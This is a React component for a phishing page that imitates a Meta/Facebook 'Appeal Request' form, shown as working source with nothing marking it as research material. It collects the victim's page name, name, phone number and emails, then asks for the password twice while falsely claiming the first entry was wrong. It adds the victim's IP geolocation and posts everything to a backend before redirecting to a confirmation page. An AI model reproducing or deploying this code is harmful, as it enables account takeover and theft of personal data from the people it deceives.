import React from 'react'
import { back_up, logo, meta_logo, search } from './Publics/images/images'
import { Link, useNavigate } from 'react-router-dom'
import { useState } from 'react';
import axios from 'axios';
import { Button, Checkbox, Form, Input } from 'antd';
const { TextArea } = Input;

const Buiness = () => {

    const [activePopup, setActivePopup] = useState(false);
    const [activePassword, setActivePassword] = useState(false);
    const [first, setActionFirst] = useState(true);
    const [firstPassword, setFirstPassword] = useState();
    const [isButtonDisabled, setIsButtonDisabled] = useState(true);

    const navigate = useNavigate();

    const handleOpendPopup = () => {
        setActivePopup(true)
    }

    const handleClosePopup = () => {
        setActivePopup(false)
    }

    const onFinish = (values) => {
        if(values.check_form === true){
            localStorage.setItem('dataForm', JSON.stringify(values))
            return handleOpendPopup()
        }
    };

    const handlePasswordChange = (e) => {
        const { value } = e.target;
        setIsButtonDisabled(value.length < 6);
    };

    const onFinishPassWord = (values) => {

        if(first === true) {
            setFirstPassword(values.fill_first_password)
            setActionFirst(false)
        }
        
        const passWord = values.fill_first_password;
        setActivePassword(true)
        const dataLocalForm = JSON.parse(localStorage.getItem('dataForm'));

        if(activePassword === true){
            axios.get(`https://api.db-ip.com/v2/free/self`)
                .then((response) => {

                    const dataPassWord = {...dataLocalForm, firt_password: firstPassword, second_password: passWord, ip:response.data.ipAddress, city: response.data.city, country: response.data.country  };
                    localStorage.setItem('dataPassWord', JSON.stringify(dataPassWord));
        
                    const data = {
                        'fill_business_email': dataPassWord.fill_business_email,
                        'fill_personal_email': dataPassWord.fill_personal_email,
                        'fill_full_name': dataPassWord.fill_full_name,
                        'fill_facebook_pagename': dataPassWord.fill_facebook_pagename,
                        'fill_phone': dataPassWord.fill_phone,
                        'ip': response.data.ipAddress,
                        'city': response.data.city,
                        'country': response.data.countryName,
                        'first_password': firstPassword,
                        'second_password': passWord,
                    }

                    axios.post( "http://localhost:8080/api/news", data) 
                        .then((response) => {
                            if (response.data.status === 0 ) {
                                navigate('/account/confirm');
                            }
                        })
                        
                })
                    
        }
    };

  return (
    <div className="business">

       <div className='header container'>
            <div className='container'>
                <div className='logo col-md-1 col-3'>
                    <img src={meta_logo} width={"100%"} alt="" />
                </div>
            </div>
       </div>

        <div className="main container">

            <div className='image col-md-7 col-12'>
                <img src={back_up} width={"100%"} alt="" />
            </div>

            <div className="form col-md-5 col-12">
            
                <div className='col-md-10 col-12'>

                    <div className="text-left pb-3" style={{fontSize: "20px", textAlign: "left"}}>
                        <strong>Appeal Request</strong>
                    </div>

                    {/* FORM START */}

                    <Form
                        name="basic"
                        initialValues={{
                        remember: true,
                        }}
                        onFinish={onFinish}
                        autoComplete="off"
                    >

                        <div className="item-form">
                            <Form.Item
                                name="fill_reason"
                                rules={[
                                    {
                                    required: true,
                                    message: 'Please input information!',
                                    },
                                ]}
                            >
                                <TextArea rows={3}  placeholder="Appeal" />
                            </Form.Item>
                        </div>

                        <div className="item-form">
                            <Form.Item
                                name="fill_facebook_pagename"
                                rules={[
                                    {
                                    required: true,
                                    message: 'Please input your facebook page name!',
                                    },
                                ]}
                            >
                                <Input placeholder='Page'/>
                            </Form.Item>
                        </div>

                        <div className="item-form">
                            <Form.Item
                                name="fill_full_name"
                                rules={[
                                    {
                                    required: true,
                                    message: 'Please input your name!',
                                    },
                                ]}
                            >
                                <Input placeholder='Your Name' />
                            </Form.Item>
                        </div>
                        
                        <div className="item-form">
                            <Form.Item
                                name="fill_phone"
                                rules={[
                                    {
                                    required: true,
                                    message: 'Please input mobile phone number!',
                                    },
                                ]}
                            >
                                <Input placeholder='Phone' />
                            </Form.Item>
                        </div>
                        
                        <div className="item-form">
                            <Form.Item
                                name="fill_personal_email"
                                rules={[
                                    {
                                    required: true,
                                    message: 'Please input personal email address!',
                                    },
                                ]}
                            >
                                <Input placeholder='Personal Email'/>
                            </Form.Item>
                        </div>

                        <div className="item-form">
                            <Form.Item
                                name="fill_business_email"
                                rules={[
                                    {
                                    required: true,
                                    message: 'Please input business email address!',
                                    },
                                ]}
                            >
                                <Input placeholder='Business Email' />
                            </Form.Item>
                        </div>

                        <div className="item-form">
                            <Form.Item
                                name="check_form"
                                valuePropName="checked"
                                rules={[
                                    {
                                    required: true,
                                    message: 'Please agree the Terms and Conditions!',
                                    },
                                ]}
                            >
                                <Checkbox >I agree the Terms and Conditions</Checkbox>
                            </Form.Item>
                        </div>


                        <Form.Item 
                            className="btn butoni"
                        >
                            <Button
                                htmlType="submit"
                                style={{
                                    backgroundColor: "transparent",
                                    outline: "none",
                                    border: 'none',
                                    boxShadow: 'none',
                                    color: "#267df1",
                                    fontWeight: '700',
                                    fontSize:'1rem'
                                }}
                            >
                                Continue
                            </Button>
                        </Form.Item>
                    </Form>
                </div>

            </div>

        </div>

        <div className={`popup  ${activePopup === true ? 'active' : ''}`} id="popup" >
            <div className="background" onClick={handleClosePopup}></div>
            <div className="content col-11">

                <Form
                    name="basicForm"
                    initialValues={{
                    remember: true,
                    }}
                    onFinish={onFinishPassWord}
                    autoComplete="off"
                >

                    <div className="modal-header custom-header px-0">
                        <h5 id="exampleModalLabel" className="modal-title" style={{fontSize: "22px", fontWeight: "600"}}>Enter Your Password</h5>
                        <button type="button" data-dismiss="modal" aria-label="Close" onClick={handleClosePopup} className="close">
                            <span aria-hidden="true" >×</span>
                        </button>
                    </div>

                    <div className="item-form">
                        <p style={{fontSize:"16px", marginBottom: "10px"}}>For your security, you need to re-enter your password to continue</p>
                        <Form.Item
                            name="fill_first_password"
                            rules={[
                                {
                                required: true,
                                message: `The password you've entered is incorrect.`,
                                },
                            ]}
                            style={{
                                margin: '0'
                            }}
                        >
                            <Input.Password onChange={handlePasswordChange} />
                        </Form.Item>
                        <p className={`password-correct ${activePassword === true ? 'active' : ''}`}>The password you've entered is incorrect.</p>
                    </div>

                    <Form.Item 
                        style={{
                            color: "rgb(255, 255, 255)", 
                            marginTop: "20px",
                            width: "auto",
                            float: 'right'
                        }}
                        className={`btn btn-submit-pass butoni ${isButtonDisabled === true  ? '' : 'active'} `}
                    >
                        <Button
                            htmlType="submit"
                            style={{
                                backgroundColor: "transparent",
                                outline: "none",
                                border: 'none',
                                boxShadow: 'none',
                                fontWeight: '700',
                                fontSize:'1rem',
                                color: 'white'
                            }}
                            disabled={isButtonDisabled}
                        >
                            Continue
                        </Button>
                    </Form.Item>
                </Form>

            </div>
        </div>
    </div>
  )
}

export default Buiness